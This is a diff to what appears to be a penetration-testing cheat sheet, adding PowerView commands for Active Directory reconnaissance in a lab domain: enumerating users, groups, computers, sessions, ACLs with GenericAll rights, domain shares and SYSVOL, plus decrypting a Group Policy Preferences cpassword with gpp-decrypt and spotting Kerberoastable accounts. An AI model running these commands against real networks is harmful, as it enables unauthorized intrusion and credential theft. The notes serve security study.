@@ -455,18 +455,29 @@ Convert-SidToName <sid/objsid> # converting SID/ObjSID to name
 #Key commands for enumerations
 Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
 Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
+Get-NetUser | select cn,pwdlastset,lastlogon
 Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
+Get-NetGroup | select cn
+Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion #attack old OS and see which are web server or file server
+Find-LocalAdminAccess #scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
+Get-NetSession -ComputerName *client74* #
+Get-ObjectAcl -Identity *stephanie* #see ObjectSID, ActiveDirectoryRights, SecurityIdentifier (securityidentifier has certain rights on objectSID)
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName
 Invoke-UserHunter
 Invoke-Portscan -Hosts sql01
 
-
 # Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
-Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights 
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName #method 1
+Convert-SidToName *S-1-5-21-1987370270-658905905-1781884369-1104*  #method 2
+Find-DomainShare #find the shares in the domain. ##TIPS: ls all the NAME (folder) found in Find-DomainShare
+ls \\*FILES04*\*docshare*   #name=docshare, computername=FILES04.corp.com
+ls \\*dc1.corp.com*\sysvol\*corp.com*\ # %SystemRoot%\SYSVOL\Sysvol\domainname on the domain controller and every domain user has access to it.
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE" #decrypt cpassword in Group Policy Preferences (GPP) in kali
 
-Find-DomainShare #find the shares in the domain
 
 Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts
-
 Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
 ```
 ### Crackmapexec
